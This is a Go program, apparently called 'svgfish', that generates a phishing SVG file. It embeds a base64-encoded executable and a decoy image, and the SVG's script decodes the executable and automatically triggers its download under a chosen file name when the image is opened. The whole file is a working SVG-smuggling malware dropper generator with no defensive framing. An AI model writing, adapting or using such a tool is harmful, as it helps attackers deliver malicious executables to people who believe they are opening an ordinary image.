package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func main(){

	fmt.Println("Hello, World!")
	argCount := len(os.Args)
	if argCount != 4{
		fmt.Println("usage: svgfish.exe exefilepath exefilename imagefilepath")
		os.Exit(1)
	}

	exefilepath := os.Args[1]
	exefilename := os.Args[2]
	imagefilepath := os.Args[3]

	exebs64 := file2base64(exefilepath)
	imgbs64 := file2base64(imagefilepath)

	svgtxt := `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg height="100%" version="1.1" viewBox="0 0 1700 863" width="100%" xml:space="preserve"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image height="863" id="Image" width="1700" xlink:href="data:image/png;base64,imgbs64"/>
  <script type="text/javascript">
    <![CDATA[
    var fileName = "myfilename"
    var base64_encoded_file = "exebs64"
    function _base64ToArrayBuffer(base64,mimeType) { 
        var binary_string =  window.atob(base64); 
        var len = binary_string.length; 
        var bytes = new Uint8Array( len ); 
        for (var i = 0; i < len; i++)        { 
            bytes[i] = binary_string.charCodeAt(i); 
            } 
        return URL.createObjectURL(new Blob([bytes], {type: mimeType})) 
    } 
    var url = _base64ToArrayBuffer(base64_encoded_file,'octet/stream') 
	var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
	document.documentElement.appendChild(a);
	a.href = url;
	a.download = fileName;
	a.click();
	URL.revokeObjectURL(url);
    ]]>
  </script>
</svg>`

	svgtxt = strings.Replace(svgtxt,"imgbs64",imgbs64,1)
	svgtxt = strings.Replace(svgtxt,"myfilename",exefilename,1)
	svgtxt = strings.Replace(svgtxt,"exebs64",exebs64,1)

	file, err := os.Create("output.svg")
	checkErr(err)
	defer file.Close()

	

	writer := bufio.NewWriter(file)
	_, err = writer.WriteString(svgtxt)
	checkErr(err)

	
	writer.Flush()
	fmt.Println("save file as output.svg")



}


func file2base64(myfilepath string) string{
	fileBytes, err := ioutil.ReadFile(myfilepath) 
	checkErr(err)
	bs64 := base64.StdEncoding.EncodeToString(fileBytes) 
	return bs64

}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}

}
